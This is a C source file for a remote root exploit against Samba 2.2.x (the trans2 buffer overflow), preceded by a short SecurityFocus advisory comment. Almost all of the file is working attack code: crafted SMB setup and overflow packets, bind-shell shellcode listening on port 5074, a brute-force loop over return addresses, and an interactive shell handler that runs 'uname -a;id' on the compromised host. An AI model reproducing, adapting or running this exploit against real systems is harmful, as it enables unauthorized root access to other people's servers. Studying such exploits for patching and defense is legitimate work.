/*
source: http://www.securityfocus.com/bid/7294/info
 
A buffer overflow vulnerability has been reported for Samba. The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory.
 
Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process.
 
It should be noted that this vulnerability affects Samba 2.2.8 and earlier. Samba-TNG 0.3.1 and earlier are also affected. 
*/

/*  0x333hate => samba 2.2.x remote root exploit
 *
 *  generic linux x86 samba remote root
 *  exploit, based on trans2root.pl
 *
 *  coded by c0wboy
 *
 *  ~ www.0x333.org ~
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define fatal(x...) { fprintf (stderr, ##x); exit(-333); }

#define BUFFER 1500
#define SHELL  5074
#define PORT   139
#define NOP    0x90
#define START  0xbfffffff
#define STOP   0xbf000000
#define OFFSET 512

typedef enum {FALSE,TRUE} BOOLEAN;


unsigned char setup1[] =
         "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00"
         "\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00"
         "\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";

unsigned char setup2[] =
         "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00"
         "\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64"
         "\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

unsigned char overflow[] =
         "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x01\x00\x00\x00\x64\x00\x00\x00\x00\xd0\x07"
         "\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x90";

unsigned char shellcode[] =
         "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66"
         "\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2\x43\x66\x53\x89"
         "\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89"
         "\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52"
         "\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80"
         "\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68"
         "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
         "\x80";

int main (int argc, char *[]);
void usage (char *);
void hate (unsigned long);
void exploit (void);
BOOLEAN connection(char *, int);
int owned (int);

char buffer[BUFFER];
char zero[808] = "";
char * target=NULL;
int port = PORT;

struct sockaddr_in temp;
struct hostent *h;
int fdsocket;

void
usage (char * prg)
{
   fprintf (stderr, "\n [~] 0x333hate => samba 2.2.x remote root exploit [~]\n");
   fprintf (stderr, " [~]        coded by c0wboy ~ www.0x333.org       [~]\n\n");
   fprintf (stderr, " Usage : %s [-t target] [-p port] [-h]\n\n", prg);
   fprintf (stderr, " \t-t\ttarget to attack\n");
   fprintf (stderr, " \t-p\tsamba port (default 139)\n");
   fprintf (stderr, " \t-h\tdisplay this help\n\n");

   exit(-333);
}

void
hate (unsigned long ret)
{
   int i;
   char *ptr=buffer;

   bzero(buffer, BUFFER);

   memcpy ((char *)ptr, overflow, 96);

   ptr += 96;
   memset ((char *)ptr, NOP, (772+36));

   ptr += (772+36);
   memcpy ((char *)ptr, shellcode, strlen (shellcode));

   ptr += strlen (shellcode);
   memset ((char *)ptr, NOP, (87+44));

   ptr += (87+44);

   for (i = 1127 ; i < 1159 ; i += 4)
      *(long *) &buffer[i] = ret;
}

void
exploit (void)
{
   BOOLEAN status;
   char outside[333];

   if(!(status = connection (target, port)))
      fatal (" [~] Error in connection\n");

   /* here we setup connection */
   if (send (fdsocket, setup1, sizeof (setup1)-1, 0) < 0)
      fatal (" [~] Error in setup (1) connection\n");
   recv (fdsocket, outside, sizeof (outside)-1, 0);

   if (send (fdsocket, setup2, sizeof (setup2)-1, 0) < 0)
      fatal (" [~] Error in setup (2) connection\n");
   recv (fdsocket, outside, sizeof (outside)-1, 0);

   /* exploiting samba */
   if (send (fdsocket, buffer, sizeof (buffer)-1, 0) < 0)
      fatal (" [~] Error in exploiting samba\n");

   if (send (fdsocket, zero, sizeof (zero)-1, 0) < 0)
      fatal (" [~] Error in exploiting samba\n");

   close (fdsocket);

   if((status = connection (target, SHELL)))
   {
      owned (fdsocket);
      close (fdsocket);
   }
}

BOOLEAN
connection (char *host, int port)
{
   BOOLEAN status = TRUE;

   temp.sin_family = AF_INET;
   temp.sin_port = htons (port);
   h = gethostbyname (host);
      
   if (h == 0)
      status = FALSE;
   else 
   {
      bcopy (h->h_addr,&temp.sin_addr,h->h_length);

      if ((fdsocket = socket (AF_INET,SOCK_STREAM,0)) < 0)
         status = FALSE;
      else
         if ((connect (fdsocket, (struct sockaddr*) &temp, sizeof (temp))) < 0)
            status = FALSE;
   }
   return status;
}

int 
owned (int fdsocket)
{
   fd_set cya;
   char outside[1024], *cmd="uname -a;id;\n";
   int x;

   FD_ZERO (&cya);
   FD_SET (fdsocket, &cya);
   FD_SET (0, &cya);

   send (fdsocket, cmd, strlen (cmd), 0);

   for(;;)
   {
      FD_SET (fdsocket, &cya);
      FD_SET (0, &cya);

      if (select (FD_SETSIZE, &cya, NULL, NULL, NULL) < 0)
         break;

      if (FD_ISSET (fdsocket, &cya))
      {
         if ((x = recv (fdsocket, outside, sizeof (outside)-1, 0)) < 0)
            fatal (" [-] cya\n");

         if (write (1, outside, x) < 0)
            break;
      }

      if (FD_ISSET (0, &cya))
      {
         if ((x = read (0, outside, sizeof (outside)-1)) < 0)
         fatal ("[-] cya\n");

         if (send (fdsocket, outside, x, 0) < 0)
            break;
      }

      usleep(10);
   }

   fprintf (stderr, " [-] cya hax0r\n");
   exit(0);
}


int
main (int argc, char * argv[])
{
   int c;
   unsigned long ret;

   while((c=getopt (argc, argv, "ht:p:")) != EOF)
   {
      switch(c)
      {
         case 't': target = optarg; break;
         case 'p': port = atoi (optarg); break;
         case 'h': usage (argv[0]);
         default : usage (argv[0]);
      }
   }

   if (argc==1 || target == NULL)
      usage (argv[0]);

   fprintf (stdout, "\n [~] 0x333hate => samba 2.2.x remote root exploit [~]\n");
   fprintf (stdout, " [~]        coded by c0wboy ~ www.0x333.org       [~]\n\n");

   fprintf (stdout, " [-] connecting to %s:%d\n", target, port);
   fprintf (stdout, " [-] stating bruteforce\n\n");

   for (ret=START; ret>=STOP; ret-=OFFSET)
   {
      fprintf (stdout, " [-] testing 0x%x\n", ret);
      hate (ret);
      exploit ();
   }
   fprintf (stdout, " [-] uhm ... maybe samba is not vulnerable !\n");
   return 0;
}


